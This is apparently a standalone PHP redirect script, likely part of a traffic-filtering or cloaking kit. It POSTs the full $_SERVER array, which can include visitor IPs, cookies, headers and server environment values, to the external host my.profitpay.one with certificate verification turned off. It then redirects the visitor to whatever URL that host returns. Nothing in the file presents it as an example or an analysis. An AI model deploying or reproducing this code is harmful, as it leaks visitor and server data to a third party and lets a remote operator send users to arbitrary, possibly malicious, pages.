<?php
$curl = curl_init( "https://my.profitpay.one/fltr/6554-3025231b4e5b0a2a2ba9a50d2b968013-127" );
curl_setopt( $curl, CURLOPT_POST, true );
curl_setopt( $curl, CURLOPT_POSTFIELDS, http_build_query($_SERVER) );
curl_setopt( $curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:100.0) Gecko/20100101 Firefox/100.0' );
curl_setopt( $curl, CURLOPT_RETURNTRANSFER, true );
curl_setopt( $curl, CURLOPT_SSL_VERIFYHOST, 0 );
curl_setopt( $curl, CURLOPT_SSL_VERIFYPEER, 0 );
curl_setopt( $curl, CURLOPT_ENCODING, '' );
$result = curl_exec( $curl );
curl_close( $curl );
$result = $result ? json_decode( $result, true ) : [];
if ( $_GET ) $result["url"] .= ( ( strpos( $result["url"], "?" ) !== false ) ? "&" : "?" ) . http_build_query( $_GET );
header( "Location: ".$result["url"] );